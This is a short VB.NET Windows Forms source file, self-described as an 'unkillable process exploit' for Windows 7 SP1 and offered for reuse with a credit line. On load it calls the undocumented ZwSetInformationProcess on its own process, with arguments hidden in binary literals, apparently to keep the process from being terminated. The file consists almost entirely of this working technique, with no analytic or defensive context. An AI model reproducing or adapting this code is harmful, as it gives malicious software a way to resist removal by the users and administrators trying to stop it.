Public Class frmMain

    '#########################################################
    '# Unkillable Process Exploit For Windows 7 SP1 V1.5.1.1 #
    '# Simple yet effective exploit, made by Gecco.          #
    '# If used, please leave this part in the code. Thanks.  #
    '#########################################################

    Private Delegate Function VarPtrCallbackDelegate(ByVal address As Integer, ByVal unutilized_1 As Integer, ByVal unutilized_2 As Integer, ByVal unutilized_3 As Integer) As Integer
    Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal wndProc As VarPtrCallbackDelegate, ByRef var As Short, ByVal unutilized_1 As Integer, ByVal unutilized_2 As Integer, ByVal unutilized_3 As Integer) As Integer
    Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal wndProc As VarPtrCallbackDelegate, ByRef var As Integer, ByVal unutilized_1 As Integer, ByVal unutilized_2 As Integer, ByVal unutilized_3 As Integer) As Integer
    Public Declare Function GetCurrentProcess Lib "kernel32.dll" () As IntPtr
    Public Declare Function ZwSetInformationProcess Lib "ntdll.dll" (hWnd As IntPtr, pInfoClass As IntPtr, pInfoLength As IntPtr, pInfo As IntPtr) As IntPtr
    Private _zero As Integer = 0

    Private Function VarPtrCallbackAddress(ByVal address As Integer, ByVal int1 As Integer, ByVal int2 As Integer, ByVal int3 As Integer) As Integer
        Return address
    End Function

    Public Function VarPtr(ByRef var As Integer) As Integer
        Return CallWindowProc(AddressOf VarPtrCallbackAddress, var, _zero, _zero, _zero)
    End Function

    Private Sub EntryPoint()
        ZwSetInformationProcess(GetCurrentProcess(), CType(&B100001L, IntPtr), CType(VarPtr(-&B1111111111111110000111011010111), IntPtr), CType(&B100L, IntPtr))
    End Sub

    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Call EntryPoint()
        Catch ex As Exception
            MsgBox(ex)
        End Try
    End Sub

    Private Sub btnEnd_Click(sender As Object, e As EventArgs) Handles btnEnd.Click
        End
    End Sub
End Class
